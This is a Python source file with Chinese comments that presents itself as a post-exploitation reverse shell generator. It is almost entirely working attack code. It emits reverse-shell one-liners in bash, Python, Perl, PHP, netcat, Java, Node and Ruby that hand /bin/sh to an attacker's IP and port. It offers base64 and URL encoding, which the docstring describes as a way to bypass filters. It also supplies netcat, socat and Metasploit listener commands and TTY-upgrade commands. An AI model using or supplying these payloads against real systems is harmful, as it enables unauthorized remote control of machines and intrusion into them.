"""
反弹 Shell 生成器 — 后渗透第一步工具.

拿到 RCE 后的标准操作: 生成反弹 shell payload.
支持多种语言/环境, 自动编码绕过.
"""

import base64
from typing import List, Dict


class ReverseShellGenerator:
    """
    反弹 Shell 生成器.

    用法:
        gen = ReverseShellGenerator()
        payloads = gen.generate("10.0.0.1", 4444)
        payloads = gen.generate("10.0.0.1", 4444, shell_type="bash")
        payloads = gen.generate("10.0.0.1", 4444, encode="base64")
    """

    def generate(self, ip: str, port: int,
                 shell_type: str = "all",
                 encode: str = "raw") -> List[Dict]:
        """
        生成反弹 shell payload 列表.

        Args:
            ip:        攻击者 IP
            port:      监听端口
            shell_type: bash/python/perl/php/nc/java/node/ruby/all
            encode:    raw/base64/url

        Returns:
            [{"type": "bash", "payload": "...", "command": "..."}]
        """
        results = []
        types = [shell_type] if shell_type != "all" else [
            "bash", "python", "perl", "php", "nc", "java", "node", "ruby"
        ]

        for st in types:
            payload = self._gen_one(st, ip, port)
            if payload:
                if encode == "base64":
                    payload = base64.b64encode(payload.encode()).decode()
                elif encode == "url":
                    from urllib.parse import quote
                    payload = quote(payload)
                results.append({
                    "type": st,
                    "payload": payload,
                    "encoded": encode != "raw",
                })
        return results

    def _gen_one(self, shell_type: str, ip: str, port: int) -> str:
        generators = {
            "bash": lambda: f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "python": lambda: f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "perl": lambda: f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,pack_sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
            "php": lambda: f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc": lambda: f"nc -e /bin/sh {ip} {port}",
            "java": lambda: f"java -r 'Runtime.getRuntime().exec(new String[]{{\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&1 >&5; done\"}})'",
            "node": lambda: f"node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\")'",
            "ruby": lambda: f"ruby -rsocket -e 'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
        }
        gen = generators.get(shell_type)
        return gen() if gen else ""

    def get_listener(self, port: int, shell_type: str = "nc") -> str:
        """生成监听命令"""
        listeners = {
            "nc": f"nc -lvnp {port}",
            "socat": f"socat TCP-LISTEN:{port},fork",
            "metasploit": f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LPORT {port}; run'",
        }
        return listeners.get(shell_type, listeners["nc"])

    def get_upgrade_commands(self) -> List[str]:
        """TTY 升级命令 (拿到 raw shell 后获取完整 TTY)"""
        return [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "script -qc /bin/bash /dev/null",
            "# 升级后执行 (完整 TTY):",
            "export TERM=xterm",
            "stty rows 50 columns 200",
        ]
